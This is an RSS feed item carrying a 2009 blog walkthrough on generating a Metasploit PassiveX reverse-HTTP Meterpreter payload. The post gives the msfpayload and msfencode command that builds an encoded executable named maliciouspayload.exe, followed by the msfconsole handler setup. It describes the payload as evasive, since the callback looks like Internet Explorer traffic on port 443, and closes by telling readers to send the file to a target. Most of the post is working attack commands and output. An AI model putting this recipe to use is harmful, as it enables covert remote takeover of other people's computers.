<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>passivex on malicious.link</title>
    <link>https://malicious.link/categories/passivex/</link>
    <description>Recent content in passivex on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 10 Jun 2009 13:21:05 +0000</lastBuildDate>
    
        <atom:link href="https://malicious.link/categories/passivex/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>PassiveX fun with Metasploit</title>
      <link>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</link>
      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
      
      <guid>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</guid>
      <description>&lt;p&gt;I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the &lt;a href=&#34;https://malicious.link/archives/440-metasploit-2.html&#34;&gt;IExpress “hack”&lt;/a&gt; would make for an very hard to spot payload.&lt;/p&gt;
&lt;p&gt;A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back. So someone looking for a rogue process will only see Internet Explorer open and talking over port 443 (as specified).&lt;/p&gt;
&lt;p&gt;(props to skape for writting PassiveX and @&lt;a href=&#34;https://twitter.com/natronkeltner&#34;&gt;NatronKeltner&lt;/a&gt; for kicking in the latest tweaks to make it work with IE7/IE8)&lt;/p&gt;
&lt;p&gt;Here are the options for msfpayload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Usage: ./msfpayload &amp;lt;payload&amp;gt; [var=val] &amp;lt;S[ummary]|C|P[erl]|[Rub]y|R[aw]|J[avascript]|e[X]ecutable|[V]BA&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And msfencode&amp;rsquo;s options if you chose to use it as I demonstrate below. However, encoding happens by default with msfpayload (IIRC):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./msfencode -h
Usage: ./msfencode &amp;lt;options&amp;gt;
OPTIONS:
-a &amp;lt;opt&amp;gt; The architecture to encode as     
-b &amp;lt;opt&amp;gt; The list of characters to avoid: &#39;x00xff&#39;      
-c &amp;lt;opt&amp;gt; The number of times to encode the data      
-e &amp;lt;opt&amp;gt; The encoder to use      
-h Help banner      
-i &amp;lt;opt&amp;gt; Encode the contents of the supplied file path      
-l List available encoders      
-m &amp;lt;opt&amp;gt; Specifies an additional module search path      
-n Dump encoder information      
-o &amp;lt;opt&amp;gt; The output file      
-s &amp;lt;opt&amp;gt; The maximum size of the encoded data      
-t &amp;lt;opt&amp;gt; The format to display the encoded buffer with (c, elf, exe, java, perl, raw, ruby, vba)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here we create the PassiveX payload. Note the PX options instead of the LHOST/LPORT:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./msfpayload windows/reflectivemeterpreter/reverse_http PXHOST=192.168.1.100 PXPORT=443 PXURI=/ R | ./msfencode -t exe -o /tmp/maliciouspayload.exe
[*] x86/shikata_ga_nai succeeded with size 97 (iteration=1)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now that we have our &amp;ldquo;malicious payload&amp;rdquo; in /tmp we get our listener ready (you can use msfcli as well, I just like msfconsole because it provides me more flexibility):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./msfconsole

 

_     
| | o      
_ _ _ _ _|_ __, , _ | | __ _|_      
/ |/ |/ | |/ | / | / _|/ _|/ / _| |      
| | |_/|__/|_/_/|_/ / |__/ |__/__/ |_/|_/      
/|      
|

 

=[ msf v3.3-dev     
+ -- --=[ 376 exploits - 234 payloads      
+ -- --=[ 20 encoders - 7 nops      
=[ 153 aux

 

msf &amp;gt; use multi/handler     
msf exploit(handler) &amp;gt; exploit -h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(I&amp;rsquo;m showing you &amp;lsquo;exploit&amp;rsquo;s options because a lot of people don&amp;rsquo;t know they exist. With two lines you can start your listener (use, then exploit):**&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Usage: exploit [options]     
Launches an exploitation attempt.

OPTIONS:     
-e &amp;lt;opt&amp;gt; The payload encoder to use. If none is specified, ENCODER is used.      
-h Help banner.      
-j Run in the context of a job.      
-n &amp;lt;opt&amp;gt; The NOP generator to use. If none is specified, NOP is used.      
-o &amp;lt;opt&amp;gt; A comma separated list of options in VAR=VAL format.      
-p &amp;lt;opt&amp;gt; The payload to use. If none is specified, PAYLOAD is used.      
-t &amp;lt;opt&amp;gt; The target index to use. If none is specified, TARGET is used.      
-z Do not interact with the session after successful exploitation.

msf exploit(handler) &amp;gt; exploit -j -z -p windows/reflectivemeterpreter/reverse_http -o PXHOST=0.0.0.0,PXPORT=443,PXURI=/,ExitOnSession=False

[*] Exploit running as background job.     
[*] PassiveX listener started.      
[*] Starting the payload handler...

 msf exploit(handler) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Listener ready to go. I chose IP: 0.0.0.0 just to make things easy. Just send off maliciouspayload.exe to your target and you&amp;rsquo;re set.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
